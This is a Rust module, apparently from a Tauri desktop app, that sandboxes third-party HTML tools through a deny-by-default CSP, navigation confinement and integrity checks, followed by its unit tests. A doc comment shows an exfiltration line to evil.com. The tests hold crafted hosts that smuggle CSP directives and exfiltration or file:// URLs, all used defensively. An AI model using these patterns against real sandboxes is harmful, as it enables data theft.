// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (C) 2026 Enigma Technologies Solutions

use sqlx::Row;
use tauri::{command, Manager, WebviewUrl, WebviewWindowBuilder};

use crate::commands::scan::is_valid_host;
use crate::commands::versioning::hash_bytes_hex;
use crate::db::DbState;
use crate::models::{CapabilityFeature, DetectedCapability, ToolManifest};
use crate::ActiveToolPaths;
use crate::AppDataDir;

/// Initialization script injected into every tool window BEFORE the tool's
/// HTML is parsed. Removes Tauri IPC globals so tools have zero OS bridge.
const BLOCK_TAURI_IPC: &str = r#"
(function () {
  'use strict';
  const BLOCKED = ['__TAURI__', '__TAURI_IPC__', '__TAURI_INTERNALS__',
                   '__TAURI_INVOKE__', 'ipc', '__TAURI_METADATA__'];
  for (const k of BLOCKED) {
    try {
      Object.defineProperty(window, k, {
        get: function () { return undefined; },
        set: function () {},
        configurable: false,
        enumerable: false,
      });
    } catch (_) {}
  }
})();
"#;

/// CSP with everything denied — applied when no capabilities are approved.
const BASELINE_CSP: &str = concat!(
    "default-src 'self'; ",
    "script-src 'self' 'unsafe-inline'; ",
    "style-src 'self' 'unsafe-inline'; ",
    "img-src 'self' data: blob:; ",
    "font-src 'self' data:; ",
    "connect-src 'none'; ",
    "media-src 'none'; ",
    "worker-src 'none'; ",
    "frame-src 'none'; ",
    "object-src 'none'; ",
    // form-action does NOT inherit from default-src. Without it, an
    // auto-submitted <form action="https://…"> exfiltrates data by navigation,
    // which connect-src cannot see.
    "form-action 'none'; ",
    "base-uri 'self'"
);

/// Build a dynamic Content-Security-Policy for a tool window based on the
/// capabilities the user has explicitly approved.
///
/// Security model:
///  - Baseline: deny-all for every fetch-type directive.
///  - Network: approved hosts added to connect-src (https + wss), style-src,
///    font-src, and img-src so CSS/font CDNs work alongside API endpoints.
///  - Camera/mic: media-src relaxed to allow getUserMedia streams.
///  - Storage: localStorage/IndexedDB always available at the same-origin level;
///    no CSP directive controls these — they're gated by origin isolation.
///  - Geolocation/Notifications/USB/Serial/HID/Bluetooth: browser permissions
///    not controlled by CSP. Granting them requires device_broker (v1+ seam).
///  - form-action stays 'none' even with hosts approved: approving a host grants
///    it as a fetch destination, not as a navigation target. Form submission
///    leaves the tool origin entirely, which is an exfiltration and phishing
///    channel that the per-host connect-src model does not cover.
///
/// v1-todo: per-host granularity on net approvals (currently all-or-nothing).
/// v1-todo: 'unsafe-eval' as an opt-in for tools that use dynamic code.
pub fn build_tool_csp(approvals: &[DetectedCapability]) -> String {
    // Extract approved net hosts (excluding the "(dynamic)" sentinel).
    //
    // Hosts are re-validated here even though scan.rs already filters them:
    // approvals are persisted as JSON in SQLite and read back untrusted, so a
    // stale row written before validation existed — or an edited database —
    // must not be able to inject directives into the policy. Invalid hosts are
    // dropped rather than raising, which fails closed: the tool launches with
    // that host simply not granted.
    let net_hosts: Vec<String> = approvals
        .iter()
        .filter_map(|cap| {
            if let DetectedCapability::Net(n) = cap {
                Some(n.net.clone())
            } else {
                None
            }
        })
        .flatten()
        .filter(|h| h != "(dynamic)")
        .filter(|h| is_valid_host(h))
        .collect();

    let allow_camera = approvals
        .iter()
        .any(|c| matches!(c, DetectedCapability::Feature(CapabilityFeature::Camera)));
    let allow_mic = approvals.iter().any(|c| {
        matches!(
            c,
            DetectedCapability::Feature(CapabilityFeature::Microphone)
        )
    });

    if net_hosts.is_empty() && !allow_camera && !allow_mic {
        return BASELINE_CSP.to_string();
    }

    // Build https:// and wss:// variants for each approved host so fetch,
    // WebSocket, and CDN requests all work under the same approval.
    let host_entries: Vec<String> = net_hosts
        .iter()
        .flat_map(|h| [format!("https://{}", h), format!("wss://{}", h)])
        .collect();
    let hosts = host_entries.join(" ");

    let connect_src = if net_hosts.is_empty() {
        "'none'".to_string()
    } else {
        hosts.clone()
    };

    // Relax style-src and font-src so CSS/font CDNs (e.g. Google Fonts) work
    // when their domains are in the approved host list.
    let style_src = if net_hosts.is_empty() {
        "'self' 'unsafe-inline'".to_string()
    } else {
        format!("'self' 'unsafe-inline' {}", hosts)
    };
    let font_src = if net_hosts.is_empty() {
        "'self' data:".to_string()
    } else {
        format!("'self' data: {}", hosts)
    };
    let img_src = if net_hosts.is_empty() {
        "'self' data: blob:".to_string()
    } else {
        format!("'self' data: blob: {}", hosts)
    };

    // Camera / microphone — getUserMedia requires a secure context (provided by
    // the custom protocol) and a permissive media-src.
    let media_src = if allow_camera || allow_mic {
        "'self' blob: mediastream:"
    } else {
        "'none'"
    };

    format!(
        "default-src 'self'; \
         script-src 'self' 'unsafe-inline'; \
         style-src {style_src}; \
         img-src {img_src}; \
         font-src {font_src}; \
         connect-src {connect_src}; \
         media-src {media_src}; \
         worker-src 'none'; \
         frame-src 'none'; \
         object-src 'none'; \
         form-action 'none'; \
         base-uri 'self'"
    )
}

/// May a tool window navigate to `url`?
///
/// CSP cannot answer this: no directive governs top-level navigation — the
/// `navigate-to` proposal was dropped and never shipped — so `connect-src
/// 'none'` does nothing against `location.href = 'https://evil.com/?' + data`.
/// Without this predicate a fully unapproved tool can still exfiltrate by
/// navigating, and can repaint itself as any site it likes.
///
/// A tool is confined to its own origin. Everything else is refused, including
/// `data:`, `javascript:`, `file:` and `about:`.
///
/// Platform note: macOS and Linux use the `sanctum-tool://` scheme directly,
/// where the host is the window label and can be pinned exactly. Windows and
/// Android serve custom protocols over `http://<scheme>.localhost`, so those
/// are matched by the `.localhost` suffix instead. The suffix match is
/// deliberately looser than an exact host comparison: getting it wrong on
/// Windows would block a tool from loading its own page, and `.localhost` is
/// reserved to loopback by RFC 6761, so the worst it admits is a same-machine
/// navigation — already an accepted item in the threat model. Tighten to an
/// exact host once the format is confirmed on a real Windows build.
fn is_allowed_tool_navigation(url: &url::Url, expected_host: &str) -> bool {
    match url.scheme() {
        "sanctum-tool" => url.host_str() == Some(expected_host),
        "http" | "https" => url.host_str().is_some_and(|h| h.ends_with(".localhost")),
        _ => false,
    }
}

/// Build a human-readable summary of what a tool is actually allowed to do,
/// based on its approved (not just detected) capabilities.
fn approved_summary(approvals: &[DetectedCapability]) -> String {
    if approvals.is_empty() {
        return "sandboxed — no network, no device access".to_string();
    }
    approvals
        .iter()
        .map(|c| c.to_plain_language())
        .collect::<Vec<_>>()
        .join("; ")
}

#[command]
pub async fn open_tool_window(
    app: tauri::AppHandle,
    db: tauri::State<'_, DbState>,
    data_dir: tauri::State<'_, AppDataDir>,
    paths: tauri::State<'_, ActiveToolPaths>,
    tool_id: String,
) -> Result<(), String> {
    // 1. Load current version + user approvals
    let tool_row = sqlx::query("SELECT name, current_ver, approvals FROM tools WHERE id = $1")
        .bind(&tool_id)
        .fetch_optional(&db.0)
        .await
        .map_err(|e| e.to_string())?
        .ok_or_else(|| format!("Tool not found: {tool_id}"))?;

    let tool_name: String = tool_row.try_get("name").unwrap_or_else(|_| "Tool".into());
    let current_ver: Option<String> = tool_row.try_get("current_ver").unwrap_or(None);
    let approvals_json: String = tool_row
        .try_get("approvals")
        .unwrap_or_else(|_| "[]".into());
    let sha = current_ver.ok_or("Tool has no version to run")?;

    let approvals: Vec<DetectedCapability> =
        serde_json::from_str(&approvals_json).unwrap_or_default();

    // 2. Integrity check — re-hash the stored file
    let version_dir = data_dir
        .0
        .join("tools")
        .join(&tool_id)
        .join("versions")
        .join(&sha);
    let html_path = version_dir.join("index.html");

    let content = std::fs::read(&html_path).map_err(|e| format!("Cannot read tool file: {e}"))?;

    let actual_sha = hash_bytes_hex(&content);
    if actual_sha != sha {
        sqlx::query("UPDATE tool_versions SET quarantined = 1 WHERE id = $1")
            .bind(&sha)
            .execute(&db.0)
            .await
            .ok();
        return Err(format!(
            "Integrity check failed for tool '{tool_name}'. \
             Expected sha256:{sha}, got sha256:{actual_sha}. \
             Tool quarantined."
        ));
    }

    // 3. Check not already quarantined
    let ver_row = sqlx::query("SELECT quarantined, manifest FROM tool_versions WHERE id = $1")
        .bind(&sha)
        .fetch_one(&db.0)
        .await
        .map_err(|e| e.to_string())?;

    let quarantined: i32 = ver_row.try_get("quarantined").unwrap_or(0);
    if quarantined != 0 {
        return Err(format!("Tool '{tool_name}' is quarantined — will not run."));
    }

    let manifest_json: String = ver_row.try_get("manifest").map_err(|e| e.to_string())?;
    let _manifest: ToolManifest =
        serde_json::from_str(&manifest_json).map_err(|e| e.to_string())?;

    // 4. Build dynamic CSP from user approvals (only capabilities that were
    //    actually detected in this version are meaningful; extras are harmless).
    let csp = build_tool_csp(&approvals);

    // 5. Register path + CSP in shared state for the protocol handler
    {
        let mut map = paths.0.lock().unwrap();
        map.insert(tool_id.clone(), (version_dir, csp));
    }

    // 6. Window label and custom-protocol URL
    let label = format!("tool-{}", tool_id);
    let url_str = format!("sanctum-tool://tool-{}/index.html", tool_id);
    let url = url::Url::parse(&url_str).map_err(|e| format!("Bad URL: {e}"))?;

    // Focus existing window instead of re-creating
    if let Some(existing) = app.get_webview_window(&label) {
        existing.set_focus().map_err(|e| e.to_string())?;
        return Ok(());
    }

    // 7. Build window title showing APPROVED (not just detected) capabilities
    let summary = approved_summary(&approvals);
    let title = format!(
        "{} — {} | ⚠ Third-party tool — not verified by Sanctum",
        tool_name, summary,
    );

    // Confine the window to its own origin. Without this, connect-src 'none'
    // is bypassable by simply navigating away — see is_allowed_tool_navigation.
    let nav_host = label.clone();

    WebviewWindowBuilder::new(&app, &label, WebviewUrl::CustomProtocol(url))
        .title(title)
        .initialization_script(BLOCK_TAURI_IPC)
        .on_navigation(move |url| is_allowed_tool_navigation(url, &nav_host))
        .inner_size(1024.0, 768.0)
        .min_inner_size(400.0, 300.0)
        .center()
        .build()
        .map_err(|e| e.to_string())?;

    Ok(())
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use crate::models::NetCapability;

    // ── Helpers ───────────────────────────────────────────────────────────────

    fn net(hosts: &[&str]) -> DetectedCapability {
        DetectedCapability::Net(NetCapability {
            net: hosts.iter().map(|s| s.to_string()).collect(),
        })
    }

    fn feat(f: CapabilityFeature) -> DetectedCapability {
        DetectedCapability::Feature(f)
    }

    /// Pull one directive's value out of a policy string.
    ///
    /// Panics rather than returning an Option: a missing directive in a
    /// deny-by-default policy is a security regression, not a test edge case,
    /// and the panic message names the directive that vanished.
    fn directive<'a>(csp: &'a str, name: &str) -> &'a str {
        csp.split(';')
            .map(str::trim)
            .find_map(|d| {
                d.strip_prefix(name)
                    .filter(|rest| rest.is_empty() || rest.starts_with(' '))
            })
            .unwrap_or_else(|| panic!("directive `{name}` missing from policy: {csp}"))
            .trim()
    }

    /// Directive names, in order, so two policies can be compared for shape.
    fn directive_names(csp: &str) -> Vec<&str> {
        csp.split(';')
            .map(str::trim)
            .filter(|d| !d.is_empty())
            .map(|d| d.split_whitespace().next().unwrap_or(d))
            .collect()
    }

    /// Every directive that must never widen, whatever the user approved.
    const ALWAYS_DENIED: [&str; 3] = ["worker-src", "frame-src", "object-src"];

    // ── Baseline: nothing approved ────────────────────────────────────────────

    #[test]
    fn no_approvals_yields_baseline() {
        assert_eq!(build_tool_csp(&[]), BASELINE_CSP);
    }

    #[test]
    fn baseline_denies_every_fetch_directive() {
        let csp = build_tool_csp(&[]);
        assert_eq!(directive(&csp, "connect-src"), "'none'");
        assert_eq!(directive(&csp, "media-src"), "'none'");
        assert_eq!(directive(&csp, "worker-src"), "'none'");
        assert_eq!(directive(&csp, "frame-src"), "'none'");
        assert_eq!(directive(&csp, "object-src"), "'none'");
    }

    #[test]
    fn baseline_confines_defaults_to_self() {
        let csp = build_tool_csp(&[]);
        assert_eq!(directive(&csp, "default-src"), "'self'");
        assert_eq!(directive(&csp, "base-uri"), "'self'");
    }

    // ── The (dynamic) sentinel is a label, never a host ───────────────────────

    #[test]
    fn dynamic_sentinel_alone_yields_baseline() {
        // A tool whose destinations could not be resolved statically gets no
        // network at all — the sentinel must never be treated as a hostname.
        let csp = build_tool_csp(&[net(&["(dynamic)"])]);
        assert_eq!(csp, BASELINE_CSP);
    }

    #[test]
    fn dynamic_sentinel_never_reaches_the_policy() {
        let csp = build_tool_csp(&[net(&["(dynamic)", "api.example.com"])]);
        assert!(
            !csp.contains("(dynamic)"),
            "sentinel leaked into CSP: {csp}"
        );
        assert!(csp.contains("https://api.example.com"));
    }

    #[test]
    fn empty_host_list_yields_baseline() {
        assert_eq!(build_tool_csp(&[net(&[])]), BASELINE_CSP);
    }

    // ── Approved network hosts ────────────────────────────────────────────────

    #[test]
    fn approved_host_is_granted_https_and_wss() {
        let csp = build_tool_csp(&[net(&["api.example.com"])]);
        let connect = directive(&csp, "connect-src");
        assert!(connect.contains("https://api.example.com"));
        assert!(connect.contains("wss://api.example.com"));
    }

    #[test]
    fn approved_host_does_not_grant_plaintext_http() {
        let csp = build_tool_csp(&[net(&["api.example.com"])]);
        assert!(
            !csp.contains("http://api.example.com"),
            "cleartext origin granted: {csp}"
        );
        assert!(!csp.contains("ws://api.example.com"));
    }

    #[test]
    fn every_approved_host_is_present() {
        let csp = build_tool_csp(&[net(&["a.example.com", "b.example.com", "c.example.com"])]);
        let connect = directive(&csp, "connect-src");
        for host in ["a.example.com", "b.example.com", "c.example.com"] {
            assert!(connect.contains(host), "{host} missing from {connect}");
        }
    }

    #[test]
    fn unapproved_host_is_absent() {
        let csp = build_tool_csp(&[net(&["api.example.com"])]);
        assert!(!csp.contains("evil.example.com"));
    }

    #[test]
    fn net_approval_relaxes_style_font_and_img() {
        // CSS and font CDNs are reached by the same approval as the API host.
        let csp = build_tool_csp(&[net(&["cdn.example.com"])]);
        for name in ["style-src", "font-src", "img-src"] {
            assert!(
                directive(&csp, name).contains("https://cdn.example.com"),
                "{name} not relaxed: {csp}"
            );
        }
    }

    #[test]
    fn net_approval_never_relaxes_script_src() {
        // The single most important invariant here: approving a network host
        // must not become permission to load remote code.
        let csp = build_tool_csp(&[net(&["cdn.example.com"])]);
        assert_eq!(directive(&csp, "script-src"), "'self' 'unsafe-inline'");
    }

    #[test]
    fn net_approval_leaves_media_denied() {
        let csp = build_tool_csp(&[net(&["api.example.com"])]);
        assert_eq!(directive(&csp, "media-src"), "'none'");
    }

    // ── Camera / microphone ───────────────────────────────────────────────────

    #[test]
    fn camera_relaxes_media_src_only() {
        let csp = build_tool_csp(&[feat(CapabilityFeature::Camera)]);
        let media = directive(&csp, "media-src");
        assert!(
            media.contains("mediastream:"),
            "media-src not relaxed: {csp}"
        );
        // Camera approval is not network approval.
        assert_eq!(directive(&csp, "connect-src"), "'none'");
    }

    #[test]
    fn microphone_relaxes_media_src_only() {
        let csp = build_tool_csp(&[feat(CapabilityFeature::Microphone)]);
        assert!(directive(&csp, "media-src").contains("mediastream:"));
        assert_eq!(directive(&csp, "connect-src"), "'none'");
    }

    // ── Features that CSP does not govern must change nothing ─────────────────

    #[test]
    fn non_media_features_do_not_widen_the_policy() {
        // Geolocation, USB, Serial, HID, Bluetooth, Notifications and Storage
        // are browser-permission or origin-scoped concerns. None of them has a
        // CSP directive, so approving them must leave the policy at baseline.
        for f in [
            CapabilityFeature::Geolocation,
            CapabilityFeature::Notifications,
            CapabilityFeature::Usb,
            CapabilityFeature::Serial,
            CapabilityFeature::Hid,
            CapabilityFeature::Bluetooth,
            CapabilityFeature::Storage,
        ] {
            assert_eq!(
                build_tool_csp(&[feat(f.clone())]),
                BASELINE_CSP,
                "{f:?} widened the policy"
            );
        }
    }

    // ── Combined approvals ────────────────────────────────────────────────────

    #[test]
    fn net_and_camera_relax_independently() {
        let csp = build_tool_csp(&[net(&["api.example.com"]), feat(CapabilityFeature::Camera)]);
        assert!(directive(&csp, "connect-src").contains("https://api.example.com"));
        assert!(directive(&csp, "media-src").contains("mediastream:"));
    }

    #[test]
    fn hard_denials_survive_approving_everything() {
        let csp = build_tool_csp(&[
            net(&["api.example.com"]),
            feat(CapabilityFeature::Camera),
            feat(CapabilityFeature::Microphone),
            feat(CapabilityFeature::Geolocation),
            feat(CapabilityFeature::Usb),
            feat(CapabilityFeature::Storage),
        ]);
        for name in ALWAYS_DENIED {
            assert_eq!(directive(&csp, name), "'none'", "{name} was widened: {csp}");
        }
        assert_eq!(directive(&csp, "base-uri"), "'self'");
        assert_eq!(directive(&csp, "default-src"), "'self'");
    }

    #[test]
    fn relaxed_policy_keeps_the_baseline_directive_set() {
        // A relaxed policy must never *drop* a directive. Dropping one is
        // silently worse than widening it, because the omission inherits
        // default-src instead of staying denied.
        let relaxed = build_tool_csp(&[net(&["api.example.com"]), feat(CapabilityFeature::Camera)]);
        assert_eq!(
            directive_names(BASELINE_CSP),
            directive_names(&relaxed),
            "directive set diverged from baseline"
        );
    }

    // ── Host validation (CSP injection) ───────────────────────────────────────

    #[test]
    fn hosts_carrying_csp_syntax_are_rejected() {
        // Each of these would restructure the policy if interpolated verbatim.
        for crafted in [
            "evil.example.com;report-uri",
            "evil.example.com,default-src",
            "evil.example.com'",
            "evil.example.com script-src",
            "evil.example.com;",
            "*.example.com",
            "evil.example.com/path",
        ] {
            let csp = build_tool_csp(&[net(&[crafted])]);
            assert_eq!(
                csp, BASELINE_CSP,
                "crafted host `{crafted}` was not dropped: {csp}"
            );
        }
    }

    #[test]
    fn a_crafted_host_cannot_smuggle_a_directive() {
        let csp = build_tool_csp(&[net(&["evil.example.com;form-action"])]);
        // The policy keeps exactly the directives it declares, in order.
        assert_eq!(directive_names(&csp), directive_names(BASELINE_CSP));
        assert!(!csp.contains("evil.example.com"));
    }

    #[test]
    fn one_bad_host_does_not_discard_the_good_ones() {
        let csp = build_tool_csp(&[net(&["evil.example.com;x", "api.example.com"])]);
        let connect = directive(&csp, "connect-src");
        assert!(connect.contains("https://api.example.com"));
        assert!(!connect.contains("evil.example.com"));
    }

    #[test]
    fn all_hosts_invalid_falls_back_to_baseline() {
        // Fails closed: nothing valid to grant means nothing is granted.
        assert_eq!(
            build_tool_csp(&[net(&["bad;host", "worse host"])]),
            BASELINE_CSP
        );
    }

    #[test]
    fn ordinary_hosts_still_pass_validation() {
        for host in [
            "api.example.com",
            "a.b.c.d.example.com",
            "xn--80ak6aa92e.com",
            "my-api.example.co.uk",
            "localhost2",
        ] {
            let csp = build_tool_csp(&[net(&[host])]);
            assert!(
                directive(&csp, "connect-src").contains(&format!("https://{host}")),
                "legitimate host `{host}` was dropped"
            );
        }
    }

    // ── form-action ───────────────────────────────────────────────────────────

    #[test]
    fn baseline_denies_form_action() {
        // form-action does not inherit from default-src; it must be explicit.
        assert_eq!(directive(BASELINE_CSP, "form-action"), "'none'");
    }

    #[test]
    fn approving_a_host_does_not_grant_it_as_a_form_target() {
        // A host approved for fetch must not become a navigation destination.
        let csp = build_tool_csp(&[net(&["api.example.com"]), feat(CapabilityFeature::Camera)]);
        assert_eq!(directive(&csp, "form-action"), "'none'");
    }

    // ── Navigation confinement ────────────────────────────────────────────────

    fn nav(url: &str) -> bool {
        is_allowed_tool_navigation(&url::Url::parse(url).expect("test url parses"), "tool-abc")
    }

    #[test]
    fn tool_may_navigate_within_its_own_origin() {
        assert!(nav("sanctum-tool://tool-abc/index.html"));
        assert!(nav("sanctum-tool://tool-abc/nested/page.html"));
    }

    #[test]
    fn tool_may_not_navigate_to_a_remote_origin() {
        // The exfiltration channel connect-src cannot close.
        assert!(!nav("https://evil.example.com/?d=secret"));
        assert!(!nav("http://evil.example.com/"));
        assert!(!nav("https://api.example.com/"));
    }

    #[test]
    fn tool_may_not_navigate_to_another_tools_origin() {
        assert!(!nav("sanctum-tool://tool-other/index.html"));
    }

    #[test]
    fn tool_may_not_navigate_to_non_http_schemes() {
        for url in [
            "data:text/html,<h1>hi",
            "file:///etc/passwd",
            "about:blank",
            "blob:https://evil.example.com/x",
        ] {
            assert!(!nav(url), "scheme allowed: {url}");
        }
    }

    #[test]
    fn windows_localhost_form_of_the_custom_protocol_is_allowed() {
        // Windows/Android serve custom protocols as http://<scheme>.localhost.
        assert!(nav("http://sanctum-tool.localhost/index.html"));
        // …but that must not become a general http exemption.
        assert!(!nav("http://evil.example.com.localhost.evil.com/"));
    }

    // ── Window title summary (the only phishing mitigation) ───────────────────

    #[test]
    fn summary_of_no_approvals_states_full_containment() {
        assert_eq!(
            approved_summary(&[]),
            "sandboxed — no network, no device access"
        );
    }

    #[test]
    fn summary_names_approved_hosts_and_devices() {
        let summary =
            approved_summary(&[net(&["api.example.com"]), feat(CapabilityFeature::Camera)]);
        assert!(summary.contains("api.example.com"), "{summary}");
        assert!(summary.contains("use your camera"), "{summary}");
    }

    #[test]
    fn summary_flags_unresolved_destinations() {
        let summary = approved_summary(&[net(&["(dynamic)"])]);
        assert!(summary.contains("determined at runtime"), "{summary}");
    }
}
